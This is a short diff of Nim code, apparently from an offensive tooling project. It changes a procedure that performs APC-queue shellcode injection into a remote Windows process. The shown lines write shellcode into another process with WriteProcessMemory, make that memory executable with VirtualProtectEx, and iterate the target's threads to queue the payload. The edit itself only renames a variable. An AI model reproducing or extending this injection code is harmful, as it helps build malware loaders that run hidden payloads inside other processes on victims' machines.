@@ -18,7 +18,7 @@ proc apcQueue[byte](shellcode: openArray[byte]): void =
     bytesWritten: SIZE_T
     processEntry: PROCESSENTRY32
     threadIds: seq[int] = @[]   
-    oldprotect: DWORD = 0
+    op: DWORD = 0
 
 
   entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
@@ -38,7 +38,7 @@ proc apcQueue[byte](shellcode: openArray[byte]): void =
   let apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr)
 
   WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
-  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr oldprotect)
+  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr op)
 
   if Thread32First(hSnapshot, addr threadEntry):
     while Thread32Next(hSnapshot, addr threadEntry):
